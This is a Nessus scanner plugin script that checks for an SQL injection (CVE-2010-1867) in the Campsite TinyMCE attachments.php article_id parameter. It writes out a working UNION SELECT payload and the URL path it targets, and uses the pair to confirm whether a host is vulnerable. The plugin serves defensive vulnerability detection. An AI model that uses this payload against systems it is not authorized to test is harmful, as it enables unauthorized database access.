#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46237);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/05/04 14:30:40 $");

  script_cve_id("CVE-2010-1867");
  script_bugtraq_id(39862);
  script_osvdb_id(64215);
  script_xref(name:"Secunia", value:"39580");

  script_name(english:"Campsite TinyMCE plugin 'attachments.php' 'article_id' Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via 'article_id' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is vulnerable to a
SQL injection attack.");

  script_set_attribute(attribute:"description", value:
"The version of Campsite installed on the remote host fails to
properly sanitize user-supplied input to the 'article_id' parameter of
the 'javascript/tinymce/plugins/campsiteattachment/attachments.php'
script.

An unauthenticated, remote attacker can leverage this issue to launch a
SQL injection attack against the affected application, leading to
authentication bypass, discovery of sensitive information, attacks
against the underlying database, and the like.");

   # http://php-security.org/2010/05/01/mops-2010-002-campsite-tinymce-article-attachment-sql-injection-vulnerability/index.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?709361da");
   # http://web.archive.org/web/20100507081806/http://www.campware.org/en/camp/campsite_news/832/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?41e2e832");
  script_set_attribute(attribute:"solution", value:"Apply the vendor-supplied patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/05/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:campware.org:campsite");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("campsite_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/campsite", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'campsite', port:port, exit_on_fail:TRUE);

exploit = '0 UNION SELECT 1,2, concat(0x4e,0x45,0x53,0x53,0x55,0x53), 4,5,6,7,8,9,10,11,12 --';

url = install['dir'] +
      '/javascript/tinymce/plugins/campsiteattachment/attachments.php?' +
      'article_id=' + urlencode(str:exploit);

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

if (
  '<title>Image List</title>' >< res[2] &&
  'onclick="CampsiteAttachmentDialog.select' >< res[2] &&
  'title="">NESSUS' >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report =
      '\n' +
      'Nessus was able to verify the issue with the following request :\n' +
      '\n' +
      '  ' + url + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, 'The Campsite install at '+build_url(qs:install['dir'] + '/', port:port) + ' is not affected.');
